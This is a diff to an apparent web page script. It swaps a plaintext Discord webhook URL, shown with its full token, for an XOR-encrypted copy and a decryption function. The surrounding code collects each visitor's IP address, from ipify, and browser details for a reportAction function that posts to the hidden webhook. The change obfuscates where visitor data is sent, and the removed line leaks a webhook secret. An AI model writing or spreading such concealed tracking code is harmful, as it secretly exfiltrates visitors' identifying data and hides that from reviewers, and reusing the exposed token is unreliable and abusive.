@@ -246,8 +246,18 @@
         </div>
     </div>
     <script>
-        const webhookURL = 'https://discord.com/api/webhooks/1413021455180103740/MM_kbo45ZIDZOOxwRmoHX7MzqsXlLCgYSzSC1CC8WOPIZLaueY1I_9KI9Yc4qzw3JLKh';
+        const encryptedWebhook = 'PxUXGwpZQEI7R0VTXyUFTQgWDkAML0cZR1U1CQwEEhBAXGsfAgMHYFVbXk1QXVhtHgEBBHhSAi42JzkVAHpCfnwRKwUZSTQ7GRgZTnZcB1kiBDwvODcdZAVYBTw2AAYvACoXO0JMQVo1ERsDFDU8ORx3c2N1MxIuRg==';
+        const key = 'Wackycom_.600';
         
+        function xorDecrypt(encryptedText, key) {
+            let decrypted = '';
+            for (let i = 0; i < encryptedText.length; i++) {
+                const charCode = encryptedText.charCodeAt(i) ^ key.charCodeAt(i % key.length);
+                decrypted += String.fromCharCode(charCode);
+            }
+            return decrypted;
+        }
+
         async function getIPAddress() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -258,7 +268,9 @@
                 return 'Unknown';
             }
         }
+        
         async function reportAction(action, url = null) {
+            const webhookURL = xorDecrypt(encryptedWebhook, key);
             const ipAddress = await getIPAddress();
             const browserInfo = {
                 'User Agent': navigator.userAgent,
